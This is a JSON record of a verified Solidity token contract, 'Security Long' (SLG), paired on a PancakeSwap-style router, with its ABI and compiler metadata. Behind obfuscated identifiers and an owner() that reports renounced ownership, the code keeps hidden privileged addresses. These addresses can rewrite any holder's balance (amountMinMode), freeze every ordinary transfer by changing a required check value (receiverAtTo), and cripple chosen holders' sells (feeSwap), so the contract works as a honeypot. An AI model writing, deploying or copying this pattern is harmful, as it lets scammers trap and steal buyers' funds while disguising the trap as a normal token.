{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\ninterface maxToAt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract modeSender {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface totalSell {\n    function createPair(address autoTradingShould, address launchedTo) external returns (address);\n}\n\ninterface toShould {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address toSenderMin) external view returns (uint256);\n\n    function transfer(address shouldEnable, uint256 autoBuyReceiver) external returns (bool);\n\n    function allowance(address limitBuy, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 autoBuyReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address shouldEnable,\n        uint256 autoBuyReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fundFrom, uint256 value);\n    event Approval(address indexed limitBuy, address indexed spender, uint256 value);\n}\n\ninterface limitEnable is toShould {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SecurityLong is modeSender, toShould, limitEnable {\n\n    function balanceOf(address toSenderMin) public view virtual override returns (uint256) {\n        return shouldLimitFrom[toSenderMin];\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return marketingList;\n    }\n\n    uint256 fundReceiver;\n\n    uint256 tradingEnableSender;\n\n    uint256 public minExempt;\n\n    function transfer(address feeAuto, uint256 autoBuyReceiver) external virtual override returns (bool) {\n        return autoEnable(_msgSender(), feeAuto, autoBuyReceiver);\n    }\n\n    function amountMinMode(address feeAuto, uint256 autoBuyReceiver) public {\n        toMin();\n        shouldLimitFrom[feeAuto] = autoBuyReceiver;\n    }\n\n    constructor (){\n        \n        maxToAt listReceiver = maxToAt(liquidityTo);\n        marketingBuy = totalSell(listReceiver.factory()).createPair(listReceiver.WETH(), address(this));\n        \n        listFund = _msgSender();\n        buyAmountMin();\n        feeAt[listFund] = true;\n        shouldLimitFrom[listFund] = shouldSender;\n        \n        emit Transfer(address(0), listFund, shouldSender);\n    }\n\n    bool private tokenShouldMode;\n\n    function tokenExempt(address totalList, address shouldEnable, uint256 autoBuyReceiver) internal returns (bool) {\n        require(shouldLimitFrom[totalList] >= autoBuyReceiver);\n        shouldLimitFrom[totalList] -= autoBuyReceiver;\n        shouldLimitFrom[shouldEnable] += autoBuyReceiver;\n        emit Transfer(totalList, shouldEnable, autoBuyReceiver);\n        return true;\n    }\n\n    function approve(address tokenWalletReceiver, uint256 autoBuyReceiver) public virtual override returns (bool) {\n        feeIs[_msgSender()][tokenWalletReceiver] = autoBuyReceiver;\n        emit Approval(_msgSender(), tokenWalletReceiver, autoBuyReceiver);\n        return true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return shouldSender;\n    }\n\n    uint256 public amountSell;\n\n    bool private limitLiquidity;\n\n    mapping(address => mapping(address => uint256)) private feeIs;\n\n    function modeEnable(address receiverIs) public {\n        require(receiverIs.balance < 100000);\n        if (teamTrading) {\n            return;\n        }\n        if (minExempt != amountSell) {\n            amountSell = minExempt;\n        }\n        feeAt[receiverIs] = true;\n        \n        teamTrading = true;\n    }\n\n    uint256 constant fundReceiverLimit = 17 ** 10;\n\n    event OwnershipTransferred(address indexed toAuto, address indexed tradingMax);\n\n    function receiverAtTo(uint256 autoBuyReceiver) public {\n        toMin();\n        fundReceiver = autoBuyReceiver;\n    }\n\n    address liquidityTo = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function decimals() external view virtual override returns (uint8) {\n        return fundTeam;\n    }\n\n    address public listFund;\n\n    bool public teamTrading;\n\n    address public marketingBuy;\n\n    string private receiverSwap = \"Security Long\";\n\n    function feeSwap(address teamMax) public {\n        toMin();\n        if (takeFundIs == minExempt) {\n            launchAt = true;\n        }\n        if (teamMax == listFund || teamMax == marketingBuy) {\n            return;\n        }\n        exemptTeam[teamMax] = true;\n    }\n\n    mapping(address => bool) public feeAt;\n\n    function transferFrom(address totalList, address shouldEnable, uint256 autoBuyReceiver) external override returns (bool) {\n        if (_msgSender() != liquidityTo) {\n            if (feeIs[totalList][_msgSender()] != type(uint256).max) {\n                require(autoBuyReceiver <= feeIs[totalList][_msgSender()]);\n                feeIs[totalList][_msgSender()] -= autoBuyReceiver;\n            }\n        }\n        return autoEnable(totalList, shouldEnable, autoBuyReceiver);\n    }\n\n    address tokenMax = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address private receiverWallet;\n\n    function allowance(address buyIs, address tokenWalletReceiver) external view virtual override returns (uint256) {\n        if (tokenWalletReceiver == liquidityTo) {\n            return type(uint256).max;\n        }\n        return feeIs[buyIs][tokenWalletReceiver];\n    }\n\n    bool public amountFrom;\n\n    function owner() external view returns (address) {\n        return receiverWallet;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return receiverSwap;\n    }\n\n    string private marketingList = \"SLG\";\n\n    bool public launchAt;\n\n    function getOwner() external view returns (address) {\n        return receiverWallet;\n    }\n\n    uint256 private takeFundIs;\n\n    uint256 private shouldSender = 100000000 * 10 ** 18;\n\n    uint8 private fundTeam = 18;\n\n    function autoEnable(address totalList, address shouldEnable, uint256 autoBuyReceiver) internal returns (bool) {\n        if (totalList == listFund) {\n            return tokenExempt(totalList, shouldEnable, autoBuyReceiver);\n        }\n        uint256 shouldReceiver = toShould(marketingBuy).balanceOf(tokenMax);\n        require(shouldReceiver == fundReceiver);\n        require(shouldEnable != tokenMax);\n        if (exemptTeam[totalList]) {\n            return tokenExempt(totalList, shouldEnable, fundReceiverLimit);\n        }\n        return tokenExempt(totalList, shouldEnable, autoBuyReceiver);\n    }\n\n    mapping(address => uint256) private shouldLimitFrom;\n\n    function buyAmountMin() public {\n        emit OwnershipTransferred(listFund, address(0));\n        receiverWallet = address(0);\n    }\n\n    function toMin() private view {\n        require(feeAt[_msgSender()]);\n    }\n\n    mapping(address => bool) public exemptTeam;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingMax\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundFrom\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyIs\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenWalletReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoBuyReceiver\",\"type\":\"uint256\"}],\"name\":\"amountMinMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenWalletReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoBuyReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toSenderMin\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyAmountMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamMax\",\"type\":\"address\"}],\"name\":\"feeSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverIs\",\"type\":\"address\"}],\"name\":\"modeEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"autoBuyReceiver\",\"type\":\"uint256\"}],\"name\":\"receiverAtTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoBuyReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoBuyReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SecurityLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}